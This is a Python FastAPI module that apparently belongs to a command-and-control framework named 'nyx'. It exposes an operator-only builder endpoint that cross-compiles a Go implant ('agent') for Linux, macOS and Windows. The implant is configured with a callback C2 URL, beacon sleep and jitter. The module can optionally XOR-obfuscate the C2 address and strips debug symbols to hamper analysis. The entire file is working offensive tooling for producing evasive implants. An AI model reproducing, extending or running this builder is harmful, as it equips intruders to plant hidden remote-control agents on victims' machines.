import os, subprocess, tempfile, shutil, secrets
from fastapi import APIRouter, HTTPException, Depends
from fastapi.responses import FileResponse
from pydantic import BaseModel
from typing import Optional
from core.auth import get_current_operator

router = APIRouter(prefix="/api/builder", tags=["builder"])

AGENT_SRC = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../agent"))

PLATFORMS = {
    "linux-amd64":   {"GOOS": "linux",   "GOARCH": "amd64",  "ext": ""},
    "linux-arm64":   {"GOOS": "linux",   "GOARCH": "arm64",  "ext": ""},
    "darwin-amd64":  {"GOOS": "darwin",  "GOARCH": "amd64",  "ext": ""},
    "darwin-arm64":  {"GOOS": "darwin",  "GOARCH": "arm64",  "ext": ""},
    "windows-amd64": {"GOOS": "windows", "GOARCH": "amd64",  "ext": ".exe"},
}


def xor_encode_hex(text: str, key: str) -> str:
    """XOR-encodes a string with key, returns hex string."""
    out = []
    for i, ch in enumerate(text.encode()):
        out.append(f"{ch ^ ord(key[i % len(key)]):02x}")
    return "".join(out)


class BuildRequest(BaseModel):
    c2_url: str
    platform: str
    sleep: int = 5
    jitter: int = 1
    obfuscate: bool = False   # XOR-obfuscate C2 URL in binary


@router.get("/platforms")
def list_platforms(_: str = Depends(get_current_operator)):
    return list(PLATFORMS.keys())


@router.post("/build")
def build_agent(req: BuildRequest, _: str = Depends(get_current_operator)):
    if req.platform not in PLATFORMS:
        raise HTTPException(400, f"Unknown platform. Choose from: {list(PLATFORMS.keys())}")

    p = PLATFORMS[req.platform]
    ext = p["ext"]
    obf_suffix = "-obf" if req.obfuscate else ""
    out_name = f"nyx-agent-{req.platform}{obf_suffix}{ext}"

    tmp_dir = tempfile.mkdtemp()
    out_path = os.path.join(tmp_dir, out_name)

    env = os.environ.copy()
    env["GOOS"]         = p["GOOS"]
    env["GOARCH"]       = p["GOARCH"]
    env["CGO_ENABLED"]  = "0"
    env["PATH"]         = env.get("PATH", "") + ":/opt/homebrew/bin:/usr/local/go/bin"

    if req.obfuscate:
        xor_key = secrets.token_hex(4)          # 8-char random hex key
        encoded_url = xor_encode_hex(req.c2_url, xor_key)
        url_var = encoded_url
        key_var = xor_key
    else:
        url_var = req.c2_url
        key_var = ""

    ldflags = (
        f"-s -w "
        f"-X main.C2URL={url_var} "
        f"-X main.XORKey={key_var} "
        f"-X main.DefaultSleep={req.sleep} "
        f"-X main.DefaultJitter={req.jitter}"
    )

    result = subprocess.run(
        ["go", "build", f"-ldflags={ldflags}", "-o", out_path, "."],
        cwd=AGENT_SRC,
        env=env,
        capture_output=True,
        text=True,
        timeout=120,
    )

    if result.returncode != 0:
        shutil.rmtree(tmp_dir, ignore_errors=True)
        raise HTTPException(500, f"Build failed: {result.stderr}")

    return FileResponse(
        out_path,
        filename=out_name,
        media_type="application/octet-stream",
        background=None,
    )
